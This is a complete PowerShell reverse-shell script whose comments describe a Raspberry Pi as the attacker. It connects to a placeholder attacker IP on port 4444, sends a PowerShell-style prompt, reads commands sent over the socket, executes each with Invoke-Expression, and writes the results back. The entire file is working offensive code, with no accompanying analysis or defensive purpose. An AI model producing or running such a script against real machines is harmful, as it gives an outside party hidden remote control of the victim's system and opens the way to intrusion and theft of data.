# Define the IP address and port of the Raspberry Pi (attacker)
$attackerIP = "ATTACKER IP" #typically etho0
$port = 4444

try {
    # Create a new TCP client and connect to the attacker
    $client = New-Object System.Net.Sockets.TCPClient($attackerIP, $port)
    if (-not $client.Connected) {
        throw "Could not establish a connection to $attackerIP on port $port."
    }

    # Get the network stream
    $stream = $client.GetStream()
    if (-not $stream) {
        throw "Failed to get the network stream."
    }

    # Initialize stream writer and reader
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true
    $buffer = New-Object System.Byte[] 1024
    $encoding = New-Object System.Text.AsciiEncoding

    while ($true) {
        try {
            # Send the current directory path as a prompt
            $writer.Write("PS " + (Get-Location).Path + "> ")

            # Read the command from the attacker
            $read = $stream.Read($buffer, 0, $buffer.Length)
            if ($read -le 0) {
                throw "Failed to read from the network stream."
            }
            $cmd = ($encoding.GetString($buffer, 0, $read)).Trim()

            # Execute the received command
            try {
                $result = (Invoke-Expression $cmd 2>&1 | Out-String)
            }
            catch {
                $result = $_.Exception.Message
            }

            # Send the result back to the attacker
            $writer.WriteLine($result)
            $writer.Flush()
        }
        catch {
            Write-Error "Error processing command: $_"
            break
        }
    }
}
catch {
    Write-Error "Critical error: $_"
}
finally {
    if ($client -and $client.Connected) {
        $client.Close()
    }
}
